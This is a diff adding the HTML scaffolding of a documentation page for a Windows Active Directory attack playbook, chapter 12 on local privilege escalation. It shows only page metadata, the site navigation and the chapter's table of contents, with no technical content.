@@ -1,0 +1,2368 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Attack reference covering recon → domain dominance, with explanations of why each technique chains.">
+      
+      
+      
+        <link rel="canonical" href="https://sowatkheang.github.io/ad_attack_playbook/12-privilege-escalation-local/">
+      
+      
+        <link rel="prev" href="../11-lateral-movement/">
+      
+      
+        <link rel="next" href="../13-domain-dominance-dcsync-golden-silver/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>12 · Privilege Escalation (Local) - Windows AD Attack Playbook v1.0.0</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"IBM Plex Sans";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/style.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="light-blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#12-privilege-escalation-local" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Windows AD Attack Playbook v1.0.0" class="md-header__button md-logo" aria-label="Windows AD Attack Playbook v1.0.0" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Windows AD Attack Playbook v1.0.0
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              12 · Privilege Escalation (Local)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/SowatKheang/ad_attack_playbook" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ad_attack_playbook
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../01-reconnaissance-enumeration/" class="md-tabs__link">
+          
+  
+  
+  Phases
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../reference/attack-decision-tree/" class="md-tabs__link">
+          
+  
+  
+  Reference
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Windows AD Attack Playbook v1.0.0" class="md-nav__button md-logo" aria-label="Windows AD Attack Playbook v1.0.0" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Windows AD Attack Playbook v1.0.0
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/SowatKheang/ad_attack_playbook" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ad_attack_playbook
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phases
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Phases
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-reconnaissance-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    01· Reconnaissance & Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-clock-skew-management/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    02· Clock Skew Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-initial-access-no-creds/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    03· Initial Access (No Creds)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-post-exploitation-with-creds/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    04· Post-Exploitation With Creds
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-adcs-certificate-attacks-esc113/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    05· ADCS Certificate Attacks (ESC1–13)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-gmsa-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    06· gMSA Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-jea-just-enough-administration-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    07· JEA (Just Enough Administration) Bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../08-cross-forest-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    08· Cross-Forest Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../09-dll-hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    09· DLL Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-wsus-attack-fake-update-server/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10· WSUS Attack (Fake Update Server)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-lateral-movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11· Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12· Privilege Escalation (Local)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12· Privilege Escalation (Local)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#120-where-you-usually-land-what-to-check" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.0 · Where you usually land + what to check
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#121-token-impersonation-seimpersonateprivilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.1 · Token Impersonation (SeImpersonatePrivilege)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#122-common-privesc-checks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.2 · Common Privesc Checks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#123-other-privileges-worth-knowing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.3 · Other privileges worth knowing
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#124-uac-bypass-admin-but-filtered-full-admin-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.4 · UAC bypass (admin-but-filtered → full admin token)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#125-worked-end-to-end-chains" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.5 · Worked end-to-end chains
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#126-opsec-detection-defenses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12.6 · OPSEC, detection, defenses
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../13-domain-dominance-dcsync-golden-silver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13· Domain Dominance (DCSync, Golden, Silver)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14-bloodyad-quick-reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14· bloodyAD Quick Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../15-laps-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15· LAPS Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../16-gpp-sysvol-credential-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16· GPP / SYSVOL Credential Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../17-dsrm-directory-services-restore-mode-abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17· DSRM (Directory Services Restore Mode) Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../18-sccm-configmgr-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18· SCCM / ConfigMgr Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../19-trust-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19· Trust Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../20-credential-attacks-additional/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20· Credential Attacks (Additional)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-persistence-techniques/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21· Persistence Techniques
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../22-coercion-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22· Coercion Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../23-ntlm-relay-advanced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23· NTLM Relay Advanced
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../24-azure-ad-hybrid-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24· Azure AD / Hybrid Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../25-defense-evasion-opsec/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    25· Defense Evasion & OPSEC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../26-snaffler-credential-hunting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    26· Snaffler / Credential Hunting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
